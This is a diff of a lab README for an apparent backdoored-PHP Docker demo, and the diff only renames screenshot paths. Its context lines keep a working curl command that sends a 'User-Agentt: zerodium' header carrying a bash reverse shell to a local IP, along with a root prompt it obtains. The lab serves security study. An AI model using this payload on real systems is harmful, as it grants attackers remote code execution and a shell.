@@ -19,7 +19,7 @@ CONTAINER ID   IMAGE                     COMMAND                  CREATED       
 ```
 runs the service at `http://youripaddress:8080` or `http://0.0.0.0:8080`
 
-![Check on your browser](images/web.png)
+![Check on your browser](pictures/web.png)
 
 
 Command Injection
@@ -31,7 +31,7 @@ testing, hello world page
 ```
 via burp suite
 
-![Command Injection](images/cmdi.png)
+![Command Injection](pictures/cmdi.png)
 Remote Code Execution using curl
 ```bash
 $ curl -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'\");" 'http://172.17.0.1:8080'
@@ -53,4 +53,4 @@ root@4607c17c5b06:/var/www/html#
 ```
 via burp suite
 
-![Remote Code Injection](images/rce.png)
+![Remote Code Injection](pictures/rce.png)
